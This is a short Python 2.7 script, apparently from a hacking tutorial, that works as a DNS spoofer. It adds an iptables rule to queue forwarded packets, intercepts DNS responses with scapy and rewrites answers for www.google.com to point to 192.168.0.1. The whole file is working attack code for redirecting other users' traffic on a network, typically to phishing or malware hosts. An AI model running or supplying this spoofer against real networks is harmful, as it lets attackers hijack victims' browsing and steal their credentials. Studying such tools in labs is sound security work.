#! user/bin/env python
# use python 2.7 as interpreter

import netfilterqueue
import scapy.all as scapy
import os


class DNSSpoof:
    def __init__(self, url, redirect):
        self.url = url
        self.redirect = redirect
        self.scapy_packet = ""
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        self.queue = netfilterqueue.NetfilterQueue()  # object of netfilterqueue class
        self.queue.bind(0, self.process_packet)  # bind the object to the que created in iptables
        self.handle_spoof()

    def handle_spoof(self):
        try:
            self.queue.run()
        except KeyboardInterrupt:
            print("\n\n[+] CTRL + C detected, exiting program and resetting iptables ...\n\n")
            os.system("iptables --flush")

    def process_packet(self, packet):
        self.scapy_packet = scapy.IP(packet.get_payload())
        if self.scapy_packet.haslayer(scapy.DNSRR):
            print(self.scapy_packet.show())
            qname = self.scapy_packet[scapy.DNSQR].qname
            if self.url in qname:
                self.modify_packet(qname)
                packet.set_payload(str(self.scapy_packet))
        packet.accept()

    def modify_packet(self, qname):
        print("[+] Spoofing Target" + str(qname))
        answer = scapy.DNSRR(rrname=qname, rdata=self.redirect)
        self.scapy_packet[scapy.DNS].an = answer
        self.scapy_packet[scapy.DNS].ancount = 1

        del self.scapy_packet[scapy.IP].len
        del self.scapy_packet[scapy.IP].chksum
        del self.scapy_packet[scapy.UDP].len
        del self.scapy_packet[scapy.UDP].chksum


dns_spoofer = DNSSpoof("www.google.com", "192.168.0.1")
